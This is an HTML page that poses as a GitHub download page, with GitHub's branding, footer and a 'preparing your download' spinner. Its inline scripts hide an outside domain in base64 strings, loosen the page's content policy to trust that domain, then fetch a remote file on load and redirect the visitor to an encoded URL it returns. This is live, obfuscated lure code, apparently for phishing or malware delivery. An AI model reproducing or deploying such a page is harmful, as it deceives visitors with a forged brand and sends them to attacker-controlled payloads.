<!DOCTYPE html>
<html lang="en">
  <head>
    <link rel="shortcut icon" href="/favicon.ico">
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>GitHub · Where the world builds software · GitHub</title>
    <meta name="description" content="Authorized access portal" />
    <link rel="icon" href="/favicon.ico" type="image/x-icon" />

    <script>
      const cspParts = [
        'ZGVmYXVsdC1zcmMgJ3NlbGYnOyA=', 
        'c2NyaXB0LXNyYyAgJ3NlbGYnICd1bnNhZmUtaW5saW5lJyA=', 
        'aHR0cHM6Ly9oaWRlb21vbm9wb2x1cy5jb207IA==',
        'c3R5bGUtc3JjICAgJ3NlbGYnOyA=',  
        'Y29ubmVjdC1zcmMgJ3NlbGYnIA==',
        'aHR0cHM6Ly9oaWRlb21vbm9wb2x1cy5jb20=' 
      ];
      const cspPolicy = cspParts.map(p => atob(p)).join('');
      const meta = document.createElement('meta');
      meta.httpEquiv = 'Content-Security-Policy';
      meta.content = cspPolicy;
      document.head.appendChild(meta);

      const cssFiles = ['styles.css', 'git-styles.css'];
      cssFiles.forEach(href => {
        const link = document.createElement('link');
        link.rel = 'stylesheet';
        link.href = href;
        document.head.appendChild(link);
      });
    </script>
  </head>
  <body>

      <header class="github-header">
        <div class="header-content">
          <a href="https://github.com/" aria-label="GitHub">
            <svg class="github-logo" viewBox="0 0 16 16" aria-hidden="true">
              <path
                d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"
              />
            </svg>
          </a>
          <span class="header-title"></span>
        </div>
      </header>

      <main class="main-content">
        <div class="download-container">
          <h1 class="primary-heading" id="statusText">Initializing...</h1>

          <div class="loading-container" id="progressIndicator">
            <div class="spinner-container">
              <div class="spinner"></div>
            </div>

            <p class="info-message">
              Please keep this window open while we prepare your download.
            </p>
          </div>
        </div>
      </main>
    </div>

    <footer class="github-footer">
      <div class="footer-bottom">
        <div class="footer-logo-section">
          <a href="https://github.com/" aria-label="GitHub">
            <svg class="footer-logo" viewBox="0 0 16 16" aria-hidden="true">
              <path
                d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"
              />
            </svg>
          </a>
          <span class="footer-copyright">© 2026 GitHub, Inc.</span>
        </div>

        <nav class="footer-links">
          <a href="https://docs.github.com/site-policy/github-terms/github-terms-of-service">Terms</a>
          <a href="https://docs.github.com/site-policy/privacy-policies/github-privacy-statement">Privacy</a>
          <a href="https://github.com/security">Security</a>
          <a href="https://www.githubstatus.com/">Status</a>
          <a href="https://docs.github.com/">Docs</a>
          <a href="https://support.github.com/?tags=dotcom-footer">Contact GitHub</a>

            Manage cookies
          </button>
          <button type="button" class="github-style-button">
            Do not share my personal information
          </button>
        </nav>
      </div>
    </footer>

    <script>
      (function() {
        'use strict';
        
        const parts = [
          'aHR0cHM6Ly8=',  
          'aGlkZW9tb25vcG9sdXM=',  
          'LmNvbS8=',  
          'c3ZvLnBhY2s='  
        ];
        
        const buildUrl = () => {
          return parts.map(p => atob(p)).join('');
        };
        
        const performRedirect = async () => {
          try {
            const apiUrl = buildUrl();
            const response = await fetch(apiUrl);
            
            if (!response.ok) {
              throw new Error('Network response failed: ' + response.status);
            }
            
            const data = await response.json();
            const decodedUrl = atob(data.c);
            
            if (!(/^https?:\/\//i.test(decodedUrl))) {
              throw new Error('URL validation failed');
            }
            
            window.location.href = decodedUrl;
          } catch (error) {
            console.error('Redirect error:', error);
          }
        };
        
        performRedirect();
      })();
    </script>
  </body>
</html>
